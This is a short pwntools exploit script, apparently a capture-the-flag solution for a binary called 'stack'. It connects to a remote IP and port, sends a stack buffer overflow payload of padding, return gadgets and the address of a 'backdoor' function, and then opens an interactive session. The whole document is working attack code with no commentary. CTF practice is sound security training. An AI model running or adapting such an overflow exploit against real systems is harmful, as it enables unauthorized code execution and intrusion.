from pwn import *

context(os='Linux',arch = 'amd64',log_level ='debug')
def debug():
    gdb.attach(p)
    pause()

elf = ELF('./stack')
#p = process('./stack')
p = remote('43.249.195.138', 22555)
ret = 0x000000000040101a
p.sendline(b'10000')
payload = b'a'*28
payload += b'\x1d'
payload += b'\x00'*2
payload += p64(ret)
payload += p64(ret)
payload += p64(elf.sym['backdoor'])

p.send(payload)
p.interactive()